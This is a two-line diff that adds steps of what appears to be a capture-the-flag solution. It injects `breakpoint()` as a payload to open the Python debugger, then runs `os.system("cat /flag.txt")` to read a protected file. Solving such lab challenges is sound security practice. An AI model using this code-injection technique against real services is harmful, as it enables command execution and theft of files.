@@ -1,0 +1,2 @@
+1. Enter the payload `breakpoint()`.
+2. Now enter `import os; os.system("cat /flag.txt")` in the PDB to read the flag.
